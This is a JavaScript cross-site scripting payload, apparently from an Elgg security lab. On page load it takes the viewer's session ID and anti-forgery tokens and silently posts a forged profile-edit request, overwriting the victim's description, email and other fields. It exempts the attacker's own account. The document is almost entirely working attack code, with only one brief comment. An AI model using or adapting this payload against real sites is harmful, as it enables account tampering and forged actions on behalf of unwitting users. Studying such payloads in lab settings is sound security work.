<script type="text/javascript">
	window.onload = function(){
		var guid = "&guid=" + elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var name = "&name="+elgg.session.user.name;
    //Declared the variables checking the parameters and their access level when the profile is edited and sent them in the "content" variable
		var desc = "&description=1605102" + "&accesslevel[description]=1";
    var bdesc = "&briefdescription=asdf" + "&accesslevel[briefdescription]=1";
    var mail = "&contactemail=alice@gmail.com" + "&accesslevel[contactemail]=1";
    var interest = "&interests=asdf" + "&accesslevel[interests]=1";
    var loc = "&location=asdf" + "&accesslevel[location]=1";
    var mob = "&mobile=asdf" + "&accesslevel[mobile]=1";
    var phn = "&phone=asdf" + "&accesslevel[phone]=1";
    var skill = "&skills=asdf" + "&accesslevel[skills]=1";
    var twt = "&twitter=asdf" + "&accesslevel[twitter]=1";
    var webst = "&website=asdf" + "&accesslevel[website]=1";

		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
		var content = token + ts + name + bdesc + mail + desc + guid + interest + loc + mob + phn + skill + twt + webst;
		if(elgg.session.user.guid != 47)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>
